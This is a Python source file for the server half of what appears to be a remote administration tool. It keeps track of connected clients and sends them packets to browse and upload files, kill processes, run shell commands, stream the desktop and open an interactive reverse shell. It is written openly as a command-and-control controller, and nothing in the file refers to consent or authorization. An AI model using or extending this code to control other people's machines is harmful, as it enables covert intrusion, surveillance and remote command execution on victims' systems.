import socket
import threading

from readerwriterlock import rwlock

from server.services.client import NetClientService
from shared.net_lib.packets.packet import PacketInformation, PacketFileSystem, PacketProcess, PacketShell, \
    PacketDesktop, PacketPresentation, PacketType


class NetServerService:
    def __init__(self, application):
        self.application = application

        self.server = None
        self.running = False
        self.clients = {}
        # create the socket AF_INET states this is an Ipv4 Socket, SOCK_STREAM states this is a TCP socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.port = 3002
        self.address = '127.0.0.1'

        self.clients_lock = rwlock.RWLockRead()

    def start_async(self):
        self.running = True
        # if we close the app, we want to release the used address immediately so other process
        # may use it, without this line if we restart the app, we won't be able to reuse immediately the address
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.address, self.port))
        # hint the OS how much connections may be queued while you are not in an accept() call
        # the OS is free to skip the value you provide so ... anyways, do not give as much attention here
        self.server_socket.listen(socket.SOMAXCONN)
        threading.Thread(target=self.server_loop).start()

    def server_loop(self):
        while self.running:
            (client_socket_fd, addr) = self.server_socket.accept()
            client = NetClientService(self, addr, client_socket_fd)

            with self.clients_lock.gen_wlock():
                self.clients[client_socket_fd.fileno()] = client

            client.interact_async()

    def request_client_info(self, client_id):
        with self.clients_lock.gen_rlock():
            client = self.clients[client_id]
        packet = PacketInformation()
        client.send_packet(packet=packet)

    def request_fs_entries(self, client_id, path):
        with self.clients_lock.gen_rlock():
            client = self.clients[client_id]
        packet = PacketFileSystem()
        packet.path = path
        client.send_packet(packet=packet)

    def try_download_file(self, client_id, path):
        pass

    def upload_file(self, client_id, path):
        with self.clients_lock.gen_rlock():
            client = self.clients[client_id]
        try:
            packet = PacketFileSystem(fs_action=PacketFileSystem.Actions.Upload, path=path)
            with open(path, 'rb') as fd:
                packet.file_data = fd.read()

            client.send_packet(packet=packet)
        except FileNotFoundError as err:
            pass

    def request_kill_process(self, client_id, pid):
        with self.clients_lock.gen_rlock():
            client = self.clients[client_id]
        packet = PacketProcess(ps_action=PacketProcess.Actions.Kill, pid=pid)
        client.send_packet(packet)

    def request_exec(self, client_id, command):
        with self.clients_lock.gen_rlock():
            client = self.clients[client_id]
        packet = PacketShell(shell_action=PacketShell.Actions.Exec, command=command)
        client.send_packet(packet)

    def request_process_list(self, client_id):
        with self.clients_lock.gen_rlock():
            client = self.clients[client_id]
        packet = PacketProcess()
        client.send_packet(packet)

    def request_desktop(self, client_id):
        with self.clients_lock.gen_rlock():
            client = self.clients[client_id]
        packet = PacketDesktop()
        client.send_packet(packet=packet)

    def stop_desktop(self, client_id):
        with self.clients_lock.gen_rlock():
            client = self.clients[client_id]
        packet = PacketDesktop(instruction=PacketDesktop.Actions.Stop)
        client.send_packet(packet)

    def request_exec_piped(self, client_id, command):
        with self.clients_lock.gen_rlock():
            client = self.clients[client_id]
        packet = PacketShell(shell_action=PacketShell.Actions.ExecPiped, command=command)
        client.send_packet(packet)

    def request_reverse_shell(self, client_id):
        with self.clients_lock.gen_rlock():
            client = self.clients[client_id]
        packet = PacketShell(shell_action=PacketShell.Actions.Interactive)
        client.send_packet(packet)

    def send_shell_command(self, client_id, command):
        with self.clients_lock.gen_rlock():
            client = self.clients[client_id]
        packet = PacketShell(shell_action=PacketShell.Actions.Interactive, command=command)
        client.send_packet(packet)

    def on_client_disconnected(self, client_model):
        client_id = client_model['client_id']
        socket_object = client_model['socket_object']
        self.application.on_client_disconnected(client_model)

        with self.clients_lock.gen_wlock():
            self.clients.pop(socket_object.fileno(), None)

    def on_exit(self):
        pass

    def on_packet_received(self, client_model, packet):
        result_op = (packet.success, packet.error_message)
        if type(packet) == PacketFileSystem:

            if packet.success and packet.fs_action == PacketFileSystem.Actions.Download:
                self.application.on_file_downloaded(client_model, packet.path, packet.file_data)
            else:
                self.application.on_file_entries_received(client_model, packet)

        elif type(packet) == PacketPresentation:
            self.application.on_client_connection(client_model)
        elif type(packet) == PacketProcess:
            self.application.on_process_list(client_model, packet.processes)
        elif type(packet) == PacketInformation:
            self.application.on_client_information(client_model, result_op, packet.info)
        elif type(packet) == PacketDesktop:
            self.application.on_desktop_data(client_model, result_op, packet.image)
        elif packet.packet_type == PacketType.PACKET_TYPE_SHELL:
            self.application.on_shell_data(client_model, result_op, packet)
        else:
            print('Unknown packet', packet)

    def get_clients(self):
        clients = []

        with self.clients_lock.gen_rlock():
            net_clients = self.clients.values()
            for net_client in net_clients:
                clients.append(net_client.get_client_model())
        return clients

    def send_packet(self, client, packet):
        client.send_packet(packet)
